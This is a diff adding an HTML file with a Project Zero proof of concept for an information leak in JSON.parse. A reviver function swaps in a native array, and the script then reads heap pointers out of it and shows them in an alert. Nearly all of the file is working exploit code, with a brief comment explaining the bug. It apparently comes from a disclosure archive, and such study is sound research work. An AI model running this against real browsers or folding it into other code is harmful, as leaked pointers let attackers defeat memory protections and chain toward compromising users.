@@ -1,0 +1,64 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=952
+
+There is an info leak in JSON.parse. If this function is called with a reviver, and the reviver modifies the output object to contain a native array, the Walk function assumes that this array is a Var array, and writes pointers to it. These pointers can then be read out of the array by script.
+
+A minimal PoC is as follows:
+
+var once = false;
+var a = 1;
+
+function f(){
+        if(!once){
+		a = new Array(1, 2, 3);
+		this[2] = a;
+	}
+        once = true;
+	return {};
+
+}
+
+
+JSON.parse("[1, 2, [4, 5]]", f);
+
+A full PoC is attached. When loaded in a browser, this PoC will delay pointers in an alert dialog.
+-->
+
+<html>
+<body>
+<script>
+
+var once = false;
+var a = 1;
+
+
+function f(){
+        if(!once){
+		a = new Array(1, 2, 3);
+		this[2] = a;
+	}
+        once = true;
+	//alert("f " + this);
+	return {};
+
+}
+
+
+JSON.parse("[1, 2, [4, 5]]", f);
+var n = new Number(a[0]);
+n = n >> 1;
+var s = n.toString(16);
+n = new Number(a[1]);
+n = n >> 1;
+s = s + n.toString(16);
+n.length = 100;
+n = new Number(a[2]);
+n = n >> 1;
+s = s + " " + n.toString(16);
+n = new Number(a[3]);
+n = n >> 1;
+s = s + n.toString(16);
+alert(s);
+</script>
+</body>
+</html>
